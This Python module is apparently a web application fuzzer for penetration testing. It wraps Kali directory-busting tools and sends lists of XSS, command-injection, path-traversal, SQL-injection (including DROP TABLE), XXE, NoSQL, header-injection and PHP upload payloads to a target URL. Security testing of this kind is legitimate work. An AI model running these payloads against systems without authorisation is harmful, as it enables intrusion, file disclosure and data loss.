"""
Web Application Fuzzer

Comprehensive web application fuzzing using Kali Linux tools:
- wfuzz, ffuf, gobuster for directory/parameter fuzzing
- Custom payload generation and injection testing
- Input validation and boundary testing
"""

import asyncio
import json
import re
import requests
import random
import string
from typing import Dict, List, Optional, Any, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from app.reconnaissance.kali_tools import KaliToolsManager
from app.logger import logger


class WebFuzzer:
    """Advanced web application fuzzer using Kali tools and custom techniques"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url.rstrip('/')
        self.kali_tools = KaliToolsManager()
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 10
        
    async def comprehensive_fuzz(self) -> Dict[str, Any]:
        """Run comprehensive fuzzing assessment"""
        logger.info(f"Starting comprehensive fuzzing for {self.target_url}")
        
        fuzz_results = {
            'target': self.target_url,
            'directory_fuzzing': {},
            'parameter_fuzzing': {},
            'header_fuzzing': {},
            'input_validation': {},
            'boundary_testing': {},
            'injection_testing': {},
            'file_upload_testing': {},
            'summary': {
                'total_findings': 0,
                'directories_found': 0,
                'parameters_found': 0,
                'vulnerabilities': 0
            }
        }
        
        # Run all fuzzing modules
        tasks = [
            self._directory_fuzzing(),
            self._parameter_fuzzing(),
            self._header_fuzzing(),
            self._input_validation_testing(),
            self._boundary_testing(),
            self._injection_fuzzing(),
            self._file_upload_fuzzing()
        ]
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Process results
        fuzz_methods = [
            'directory_fuzzing',
            'parameter_fuzzing',
            'header_fuzzing',
            'input_validation',
            'boundary_testing',
            'injection_testing',
            'file_upload_testing'
        ]
        
        for i, result in enumerate(results):
            if not isinstance(result, Exception):
                fuzz_results[fuzz_methods[i]] = result
            else:
                logger.error(f"Fuzz method {fuzz_methods[i]} failed: {result}")
                fuzz_results[fuzz_methods[i]] = {'error': str(result)}
        
        # Generate summary
        fuzz_results['summary'] = self._generate_summary(fuzz_results)
        
        logger.info(f"Fuzzing completed. Found {fuzz_results['summary']['total_findings']} issues")
        return fuzz_results
    
    async def _directory_fuzzing(self) -> Dict:
        """Fuzz directories and files using multiple Kali tools"""
        logger.info("Starting directory and file fuzzing")
        
        results = {
            'gobuster': {},
            'wfuzz': {},
            'ffuf': {},
            'custom_fuzzing': {}
        }
        
        # Use gobuster from Kali
        gobuster_result = self.kali_tools.gobuster_dir(self.target_url)
        results['gobuster'] = gobuster_result
        
        # Use wfuzz if available
        if self.kali_tools.tools_available.get('wfuzz'):
            wfuzz_cmd = [
                'wfuzz', '-c', '-z', 'file,/usr/share/wordlists/dirb/common.txt',
                '--hc', '404', f"{self.target_url}/FUZZ"
            ]
            wfuzz_result = self.kali_tools._execute_command(wfuzz_cmd, timeout=300)
            results['wfuzz'] = wfuzz_result
        
        # Use ffuf if available
        if self.kali_tools.tools_available.get('ffuf'):
            ffuf_cmd = [
                'ffuf', '-w', '/usr/share/wordlists/dirb/common.txt',
                '-u', f"{self.target_url}/FUZZ", '-mc', '200,301,302,403'
            ]
            ffuf_result = self.kali_tools._execute_command(ffuf_cmd, timeout=300)
            results['ffuf'] = ffuf_result
        
        # Custom directory fuzzing
        custom_paths = [
            'admin', 'administrator', 'api', 'backup', 'config', 'database',
            'dev', 'docs', 'files', 'images', 'includes', 'js', 'css',
            'login', 'panel', 'private', 'public', 'scripts', 'secure',
            'test', 'tmp', 'upload', 'uploads', 'user', 'users', 'www',
            '.git', '.svn', '.env', '.htaccess', 'web.config', 'robots.txt'
        ]
        
        found_paths = []
        for path in custom_paths:
            try:
                url = urljoin(self.target_url, path)
                response = self.session.head(url)
                if response.status_code in [200, 301, 302, 403]:
                    found_paths.append({
                        'path': path,
                        'url': url,
                        'status_code': response.status_code,
                        'content_length': response.headers.get('content-length', 'unknown')
                    })
            except:
                continue
        
        results['custom_fuzzing']['found_paths'] = found_paths
        
        return results
    
    async def _parameter_fuzzing(self) -> Dict:
        """Fuzz GET/POST parameters"""
        logger.info("Starting parameter fuzzing")
        
        results = {
            'get_parameters': {},
            'post_parameters': {},
            'hidden_parameters': {}
        }
        
        # Common parameter names to fuzz
        common_params = [
            'id', 'user', 'username', 'password', 'email', 'name', 'search',
            'q', 'query', 'page', 'limit', 'offset', 'sort', 'order', 'filter',
            'category', 'type', 'action', 'cmd', 'command', 'file', 'path',
            'url', 'redirect', 'return', 'callback', 'debug', 'test', 'admin',
            'token', 'session', 'key', 'api_key', 'access_token', 'csrf_token'
        ]
        
        # Test GET parameters
        get_findings = []
        for param in common_params:
            try:
                test_url = f"{self.target_url}?{param}=test"
                response = self.session.get(test_url)
                
                # Check if parameter is reflected or causes different behavior
                if 'test' in response.text or response.status_code != 200:
                    get_findings.append({
                        'parameter': param,
                        'url': test_url,
                        'status_code': response.status_code,
                        'reflected': 'test' in response.text,
                        'content_length': len(response.content)
                    })
            except:
                continue
        
        results['get_parameters']['findings'] = get_findings
        
        # Test POST parameters (if forms are found)
        try:
            response = self.session.get(self.target_url)
            forms = re.findall(r'<form[^>]*>(.*?)</form>', response.text, re.DOTALL | re.IGNORECASE)
            
            post_findings = []
            for form in forms:
                # Extract form action and method
                action_match = re.search(r'action=["\']([^"\']*)["\']', form, re.IGNORECASE)
                method_match = re.search(r'method=["\']([^"\']*)["\']', form, re.IGNORECASE)
                
                action = action_match.group(1) if action_match else ''
                method = method_match.group(1).upper() if method_match else 'GET'
                
                if method == 'POST':
                    form_url = urljoin(self.target_url, action)
                    
                    # Test common POST parameters
                    for param in common_params[:10]:  # Limit to avoid being too aggressive
                        try:
                            data = {param: 'fuzz_test'}
                            post_response = self.session.post(form_url, data=data)
                            
                            if post_response.status_code != 404 and 'fuzz_test' in post_response.text:
                                post_findings.append({
                                    'parameter': param,
                                    'form_url': form_url,
                                    'status_code': post_response.status_code,
                                    'reflected': True
                                })
                        except:
                            continue
            
            results['post_parameters']['findings'] = post_findings
            
        except Exception as e:
            logger.error(f"POST parameter fuzzing failed: {e}")
            results['post_parameters']['error'] = str(e)
        
        return results
    
    async def _header_fuzzing(self) -> Dict:
        """Fuzz HTTP headers for hidden functionality"""
        logger.info("Starting HTTP header fuzzing")
        
        results = {
            'custom_headers': {},
            'header_injection': {}
        }
        
        # Test custom headers that might reveal functionality
        test_headers = {
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'X-Originating-IP': '127.0.0.1',
            'X-Remote-IP': '127.0.0.1',
            'X-Client-IP': '127.0.0.1',
            'X-Forwarded-Host': 'localhost',
            'X-Forwarded-Proto': 'https',
            'X-Admin': 'true',
            'X-Debug': 'true',
            'X-Test': 'true',
            'Authorization': 'Bearer test',
            'X-API-Key': 'test',
            'X-Access-Token': 'test'
        }
        
        header_findings = []
        baseline_response = self.session.get(self.target_url)
        baseline_length = len(baseline_response.content)
        
        for header, value in test_headers.items():
            try:
                headers = {header: value}
                response = self.session.get(self.target_url, headers=headers)
                
                # Check for different response
                if (response.status_code != baseline_response.status_code or 
                    abs(len(response.content) - baseline_length) > 100):
                    
                    header_findings.append({
                        'header': header,
                        'value': value,
                        'status_code': response.status_code,
                        'content_length_diff': len(response.content) - baseline_length,
                        'interesting': True
                    })
            except:
                continue
        
        results['custom_headers']['findings'] = header_findings
        
        # Test header injection
        injection_payloads = [
            '\r\nX-Injected: true',
            '\nX-Injected: true',
            '%0d%0aX-Injected: true',
            '%0aX-Injected: true'
        ]
        
        injection_findings = []
        for payload in injection_payloads:
            try:
                headers = {'User-Agent': f'Mozilla/5.0{payload}'}
                response = self.session.get(self.target_url, headers=headers)
                
                if 'X-Injected' in str(response.headers):
                    injection_findings.append({
                        'payload': payload,
                        'injected_header_found': True,
                        'vulnerability': 'HTTP Header Injection'
                    })
            except:
                continue
        
        results['header_injection']['findings'] = injection_findings
        
        return results
    
    async def _input_validation_testing(self) -> Dict:
        """Test input validation with various payloads"""
        logger.info("Starting input validation testing")
        
        results = {
            'xss_testing': {},
            'command_injection': {},
            'path_traversal': {},
            'ldap_injection': {}
        }
        
        # XSS payloads
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            "';alert('XSS');//",
            'javascript:alert("XSS")',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>'
        ]
        
        # Command injection payloads
        cmd_payloads = [
            '; ls',
            '| whoami',
            '&& id',
            '`id`',
            '$(id)',
            '; cat /etc/passwd',
            '| cat /etc/passwd'
        ]
        
        # Path traversal payloads
        path_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        ]
        
        # Test payloads against discovered parameters
        parsed_url = urlparse(self.target_url)
        if parsed_url.query:
            params = parse_qs(parsed_url.query)
            
            for param_name in params.keys():
                # Test XSS
                xss_findings = []
                for payload in xss_payloads[:3]:  # Limit to avoid being too aggressive
                    try:
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(test_params, doseq=True)}"
                        
                        response = self.session.get(test_url)
                        if payload in response.text:
                            xss_findings.append({
                                'parameter': param_name,
                                'payload': payload,
                                'reflected': True,
                                'url': test_url
                            })
                    except:
                        continue
                
                results['xss_testing'][param_name] = xss_findings
                
                # Test command injection
                cmd_findings = []
                for payload in cmd_payloads[:3]:
                    try:
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(test_params, doseq=True)}"
                        
                        response = self.session.get(test_url)
                        
                        # Check for command execution indicators
                        cmd_indicators = ['uid=', 'gid=', 'root:', 'bin/bash', 'Permission denied']
                        if any(indicator in response.text for indicator in cmd_indicators):
                            cmd_findings.append({
                                'parameter': param_name,
                                'payload': payload,
                                'potential_execution': True,
                                'url': test_url
                            })
                    except:
                        continue
                
                results['command_injection'][param_name] = cmd_findings
        
        return results
    
    async def _boundary_testing(self) -> Dict:
        """Test application boundaries and limits"""
        logger.info("Starting boundary testing")
        
        results = {
            'buffer_overflow': {},
            'integer_overflow': {},
            'large_inputs': {}
        }
        
        # Generate boundary test cases
        boundary_tests = {
            'long_string': 'A' * 10000,
            'very_long_string': 'A' * 100000,
            'null_bytes': 'test\x00test',
            'unicode': 'test\u0000\u0001\u0002',
            'large_number': '9' * 20,
            'negative_number': '-' + '9' * 20,
            'special_chars': '!@#$%^&*()_+-=[]{}|;:,.<>?',
            'sql_chars': "'; DROP TABLE users; --",
            'format_strings': '%s%s%s%s%s%s%s%s%s%s'
        }
        
        # Test against discovered parameters
        parsed_url = urlparse(self.target_url)
        if parsed_url.query:
            params = parse_qs(parsed_url.query)
            
            for param_name in params.keys():
                param_findings = []
                
                for test_name, test_value in boundary_tests.items():
                    try:
                        test_params = params.copy()
                        test_params[param_name] = [test_value]
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(test_params, doseq=True)}"
                        
                        response = self.session.get(test_url)
                        
                        # Check for error conditions
                        error_indicators = [
                            'error', 'exception', 'stack trace', 'warning',
                            'fatal', 'mysql', 'postgresql', 'oracle', 'sql',
                            'segmentation fault', 'access violation'
                        ]
                        
                        has_error = any(indicator in response.text.lower() for indicator in error_indicators)
                        
                        if has_error or response.status_code >= 500:
                            param_findings.append({
                                'test_type': test_name,
                                'payload': test_value[:100] + '...' if len(test_value) > 100 else test_value,
                                'status_code': response.status_code,
                                'has_error': has_error,
                                'response_length': len(response.content)
                            })
                    except:
                        continue
                
                if param_findings:
                    results['boundary_testing'][param_name] = param_findings
        
        return results
    
    async def _injection_fuzzing(self) -> Dict:
        """Comprehensive injection testing"""
        logger.info("Starting injection fuzzing")
        
        results = {
            'sql_injection': {},
            'nosql_injection': {},
            'xml_injection': {},
            'ldap_injection': {}
        }
        
        # SQL injection payloads
        sql_payloads = [
            "' OR '1'='1",
            '" OR "1"="1',
            "' OR 1=1--",
            '" OR 1=1--',
            "' UNION SELECT NULL--",
            "'; WAITFOR DELAY '00:00:05'--"
        ]
        
        # NoSQL injection payloads
        nosql_payloads = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$where": "this.password.match(/.*/)"}',
            '[$ne]=1'
        ]
        
        # XML injection payloads
        xml_payloads = [
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
            '<script>alert("XSS")</script>',
            ']]><script>alert("XSS")</script>'
        ]
        
        # Test against parameters
        parsed_url = urlparse(self.target_url)
        if parsed_url.query:
            params = parse_qs(parsed_url.query)
            
            for param_name in params.keys():
                # Test SQL injection
                sql_findings = []
                for payload in sql_payloads[:3]:
                    try:
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(test_params, doseq=True)}"
                        
                        response = self.session.get(test_url)
                        
                        # Check for SQL error patterns
                        sql_errors = [
                            'mysql_fetch_array', 'ORA-01756', 'Microsoft OLE DB',
                            'SQLServer JDBC Driver', 'PostgreSQL query failed',
                            'Warning: mysql_', 'MySQLSyntaxErrorException'
                        ]
                        
                        for error in sql_errors:
                            if error.lower() in response.text.lower():
                                sql_findings.append({
                                    'payload': payload,
                                    'error_pattern': error,
                                    'potential_sqli': True
                                })
                                break
                    except:
                        continue
                
                if sql_findings:
                    results['sql_injection'][param_name] = sql_findings
        
        return results
    
    async def _file_upload_fuzzing(self) -> Dict:
        """Test file upload functionality"""
        logger.info("Starting file upload fuzzing")
        
        results = {
            'upload_forms': {},
            'file_type_bypass': {},
            'malicious_uploads': {}
        }
        
        try:
            response = self.session.get(self.target_url)
            
            # Look for file upload forms
            upload_patterns = [
                r'<input[^>]*type=["\']file["\'][^>]*>',
                r'<form[^>]*enctype=["\']multipart/form-data["\'][^>]*>'
            ]
            
            upload_forms = []
            for pattern in upload_patterns:
                matches = re.findall(pattern, response.text, re.IGNORECASE)
                upload_forms.extend(matches)
            
            results['upload_forms']['found'] = upload_forms
            results['upload_forms']['count'] = len(upload_forms)
            
            if upload_forms:
                # Test file upload bypasses (only if forms are found)
                test_files = {
                    'php_shell.php': b'<?php echo "Test"; ?>',
                    'test.php.jpg': b'<?php echo "Bypass"; ?>',
                    'test.phtml': b'<?php echo "PHTML"; ?>',
                    'test.php5': b'<?php echo "PHP5"; ?>',
                    'test.txt': b'Normal text file'
                }
                
                bypass_results = []
                for filename, content in test_files.items():
                    # This would be implemented with actual form submission
                    # For now, just log the test cases
                    bypass_results.append({
                        'filename': filename,
                        'content_type': 'application/octet-stream',
                        'test_case': 'File extension bypass'
                    })
                
                results['file_type_bypass']['test_cases'] = bypass_results
        
        except Exception as e:
            logger.error(f"File upload fuzzing failed: {e}")
            results['error'] = str(e)
        
        return results
    
    def _generate_summary(self, fuzz_results: Dict) -> Dict:
        """Generate fuzzing summary"""
        summary = {
            'total_findings': 0,
            'directories_found': 0,
            'parameters_found': 0,
            'vulnerabilities': 0
        }
        
        # Count findings from different fuzzing results
        for fuzz_type, results in fuzz_results.items():
            if fuzz_type == 'summary':
                continue
                
            if isinstance(results, dict):
                # Count directory findings
                if 'found_paths' in results:
                    summary['directories_found'] += len(results['found_paths'])
                
                # Count parameter findings
                if 'findings' in results:
                    summary['parameters_found'] += len(results['findings'])
                
                # Count vulnerabilities
                for key, value in results.items():
                    if isinstance(value, list):
                        summary['vulnerabilities'] += len(value)
                    elif isinstance(value, dict) and 'findings' in value:
                        summary['vulnerabilities'] += len(value['findings'])
        
        summary['total_findings'] = (summary['directories_found'] + 
                                   summary['parameters_found'] + 
                                   summary['vulnerabilities'])
        
        return summary